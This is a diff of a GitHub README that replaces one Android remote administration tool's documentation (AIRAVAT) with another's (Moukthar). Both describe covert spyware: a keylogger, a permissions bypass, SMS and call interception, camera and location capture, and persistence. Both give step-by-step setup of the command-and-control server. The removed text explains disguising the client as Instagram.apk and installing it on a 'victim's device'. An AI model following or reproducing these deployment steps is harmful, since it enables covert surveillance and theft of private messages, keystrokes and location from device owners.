@@ -1,86 +1,124 @@
+## Moukthar
+Remote adminitration tool for android
 
+### Features
+- Permissions bypass (android 12 below) https://youtube.com/shorts/-w8H0lkFxb0
+- Keylogger https://youtube.com/shorts/Ll9dNrkjFOA
+- Notifications listener
+- SMS listener
+- Phone call recording
+- Image capturing and screenshots
+- Video recording
+- Persistence 
+- Read & write contacts
+- List installed applications
+- Download & upload files
+- Get device location
 
-<p align="center">
-<img src='WEB PANEL/img/logo.png' style="height:100px;width:100px;" >
-</p>
-<h1 align=center>AIRAVAT</h1>
+[![Tutorial Video](https://img.youtube.com/vi/ykOx19hAaD4/0.jpg)](https://youtu.be/ykOx19hAaD4)
 
-#### A multifunctional Android RAT with GUI based Web Panel without port forwarding.
+### Installation
+- Clone repository
+  ```console
+  git clone https://github.com/Tomiwa-Ot/moukthar.git
+  ```
+- Install php, composer, mysql, php-mysql driver, apache2 and a2enmod
+- Move server files to ```/var/www/html/``` and install dependencies
+  ```console
+  mv moukthar/Server/* /var/www/html/
+  cd /var/www/html/c2-server
+  composer install
+  cd /var/www/html/web-socket/
+  composer install
+  cd /var/www
+  chown -R www-data:www-data .
+  chmod -R 777 .
+  ```
+  The default credentials are username: ```android``` and password: ```android```
+- Create new sql user
+  ```mysql
+  CREATE USER 'android'@'localhost' IDENTIFIED BY 'your-password';
+  GRANT ALL PRIVILEGES ON *.* TO 'android'@'localhost';
+  FLUSH PRIVILEGES;
+  ```
+- Set database credentials in ```c2-server/.env``` and ```web-socket/.env```
+- Execute ```database.sql```
+- Start web socket server or deploy as service in linux
+  ```console
+  php Server/web-socket/App.php
+  # OR
+  sudo mv Server/websocket.service /etc/systemd/system/
+  sudo systemctl daemon-reload
+  sudo systemctl enable websocket.service
+  sudo systemctl start websocket.service
+  ```
+- Modify ```/etc/apache2/sites-available/000-default.conf```
+  ```console
+  <VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html/c2-server
+        DirectoryIndex app.php
+        Options -Indexes
 
-> [!IMPORTANT]
-> The source code has been published <a href="./ANDROID APP/AIRAVAT.swb" >here</a> use <a href="https://github.com/Sketchware-Pro/Sketchware-Pro" >Sketchware Pro</a> to view the source code.
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+  </VirtualHost>
 
+  ```
+- Modify ```/etc/apache2/apache2.conf```
+  ```xml
+    Comment this section
+    #<Directory />
+    #       Options FollowSymLinks
+    #       AllowOverride None
+    #       Require all denied
+    #</Directory>
 
-<div align="center">
+   Add this
+    <Directory /var/www/html/c2-server>
+        Options -Indexes
+        DirectoryIndex app.php
+        AllowOverride All
+        Require all granted
+    </Directory>
+  ```
+- Increase php file upload max size ```/etc/php/*.*/apache2/php.ini```
+  ```ini
+  ; Increase size to permit large file uploads from client
+  upload_max_filesize = 128M
+  ; Set post_max_size to upload_max_filesize + 1
+  post_max_size = 129M
+  ```
+- Set web socket server address in <script> tag in ```c2-server/src/View/home.php``` and ```c2-server/src/View/features/files.php```
+  ```console
+  const ws = new WebSocket('ws://IP_ADDRESS:8080');
+  ```
+- Restart apache using the command below
+  ```console
+  sudo a2enmod rewrite && sudo service apache2 restart
+  ```
+- Set C2 server and web socket server address in client ```functionality/Utils.java```
+  ```java
+  public static final String C2_SERVER = "http://localhost";
 
-</div>
+  public static final String WEB_SOCKET_SERVER = "ws://localhost:8080";
+  ```
+- Compile APK using Android Studio and deploy to target
 
-## Features
-## Requirements
- - Firebase Account
- - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
-[ApkTool M](https://maximoff.su/apktool/?lang=en) ( for Android)
+### Screenshots
+![Login](screenshots/login.png)
+![Dashboard](screenshots/c2.png)
+![Installed Apps](screenshots/apps.png)
+![Camera](screenshots/camera.png)
+![Contacts](screenshots/contacts.png)
+![Files](screenshots/files.png)
+![Notifications](screenshots/notifications.png)
+![SMS](screenshots/sms.png)
+![Video](screenshots/video.png)
 
-
-## How to Build 
-  ### Firebase Setup
- 1. Create an Firebase Account and afterwords create a new project with any name.
- 1. Enable Firebase Database and Firebase Storage.
- 1. In Firebase Database Click on the rules and set `.read` and `.write` to `true`
-    - ```js
-          {
-           "rules": {
-                   ".read": "true",
-                   ".write": "true"
-                    }
-          }
-      ```
- 1. In Firebase Storage allow reads and writes for all paths.
-    - ```js
-        rules_version = '2';
-        service firebase.storage {
-        match /b/{bucket}/o {
-            match /{allPaths=**} {
-               allow read, write 
-              }
-          }
-       }
-      ```
- 1. Now Go to project overview and create an Android App and download the `google-services.json` file.
- 1. Also create a web app and copy the config of webapp.
-   ### Panel Setup
- 1. You can use Github Pages , Firebase Hosting or any Hosting Website (except 000webhost) for hosting the panel.
- 1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 16](https://github.com/Th30neAnd0nly/AIRAVAT/blob/325ff0befec72a55c273e99a0e06059db9d599fb/WEB%20PANEL/index.html#L16) replace the config with your web app config which you have created on Step 6.
- 1. Save the file , Your Panel Setup is completed.
- ### Android RAT
- 1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
- 1. Decompile it using any Decompiler recommend above.
- 1. Now open `res/values/strings.xml` file.
- 1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
-    - Example 
-       ```xml 
-       <string name="firebase_database_url">https://your_database_url.firebase.com</string>
-       <string name="google_api_key">your_api_key</string>
-       <string name="google_app_id">your_app_id</string>
-       <string name="google_storage_bucket">your_storage_bucket_url</string>
-       <string name="project_id">project_id</string>
-       ```
- 1. Now compile the code with appt2.
- 1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.
-  ### Tutorial Videos
-  1. To be updated...
-
-### ❤️Supporters❤️
-[![Stargazers repo roster for @th30neand0nly/AIRAVAT](http://reporoster.com/stars/dark/Th30neAnd0nly/AIRAVAT)](https://github.com/Th30neAnd0nly/AIRAVAT/stargazers)
-
-[![Forkers repo roster for @th30neand0nly/AIRAVAT](http://reporoster.com/forks/dark/Th30neAnd0nly/AIRAVAT)](https://github.com/Th30neAnd0nly/AIRAVAT/network/members)
-
-
-
-## DISCLAIMER
-<p align="center">
- TO BE USED FOR EDUCATIONAL PURPOSES ONLY
-</p>
-
-
-The use of the AIRAVAT is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read [LICENSE](LICENSE).
+### TODO
+- Auto scroll logs on dashboard
+- Screenshot not working
+- Image/Video capturing doesn't work when application isn't in focus
+- Downloading files in app using DownloadManager not working
+- Listing constituents of a directory doesn't list all files/folders
